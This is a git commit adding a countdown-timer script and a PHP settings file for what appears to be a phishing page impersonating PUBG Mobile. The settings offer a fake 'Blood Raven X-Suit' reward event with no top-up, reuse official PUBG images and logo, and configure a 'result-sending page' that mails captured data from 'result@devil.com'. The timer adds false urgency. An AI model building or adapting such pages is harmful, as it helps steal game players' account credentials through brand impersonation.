e544475d3b924a1b082bc2a469ce006e068062af
thesolomen <113979854+thesolomen@users.noreply.github.com>
2022-09-20 22:11:03 +0500

    Add files via upload

---
+++ js/timer.js
@@ -0,0 +1,37 @@
+$(document).ready(function() { 
+var detik = 59;
+var menit = 59;
+var jam = 23;
+function hitung() { 
+setTimeout(hitung,1000); $('#latestTimer').html( '' + jam + ' : ' + menit + ' : ' + detik + ''); detik --; 
+if(detik < 0) { 
+detik = 59; 
+menit --; 
+if(menit < 0) { 
+menit = 0; 
+detik = 0; 
+} 
+} 
+} 
+hitung(); 
+}
+);
+
+$(document).ready(function() { 
+var detik = 59;
+var menit = 59;
+var jam = 23;
+function hitung() { 
+setTimeout(hitung,1000); $('#seasonTimer').html( '' + jam + ' : ' + menit + ' : ' + detik + ''); detik --; 
+if(detik < 0) { 
+detik = 59; 
+menit --; 
+if(menit < 0) { 
+menit = 0; 
+detik = 0; 
+} 
+} 
+} 
+hitung(); 
+}
+);
---
+++ system/setting.php
@@ -0,0 +1,17 @@
+<?php
+// KONTROL UNTUK MENDAPATKAN ZONA WAKTU (JAKARTA)
+date_default_timezone_set('Asia/Jakarta');
+$jamasuk = date('l, d-m-Y h:i:s');
+
+//KONTROL UNTUK DESKRIPSI HALAMAN
+$title = 'PUBG MOBILE: Blood Raven X-Suit';
+$description = 'Collect your special rewards at the Blood Raven X-Suit event. This opportunity is limited and without the need for topup. Collect your rewards now!';
+$copyright = 'PUBG MOBILE';
+$theme = '#000';
+$image = 'https://www.pubgmobile.com/images/event/bloodravenx_suit/share/en.jpg';
+$icon = 'https://www.pubgmobile.com/common/images/icon_logo.jpg';
+
+// KONTROL UNTUK HALAMAN KIRIM RESULT
+$author = 'ITS ME LUCIFER';
+$sender = 'From: RAVEN PUBG <result@devil.com>';
+?>
